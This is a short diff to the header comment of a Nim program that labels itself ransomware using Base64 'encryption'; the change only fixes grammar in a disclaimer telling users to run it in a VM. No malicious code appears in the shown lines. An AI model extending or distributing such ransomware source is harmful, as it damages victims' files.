@@ -4,7 +4,7 @@
     Type : ransomeware (encryption/decryption)
     Type of Encryption : Base64 encoding
     Language : nim
-    (** The Creator of this ransomeware is not responsible for any damages done use this in a vm or a place where there are not important files **)
+    (** The Creator of this ransomeware is not responsible for any damages done use this in a vm or a place where there are no important files **)
 ]#
 
 import std/base64
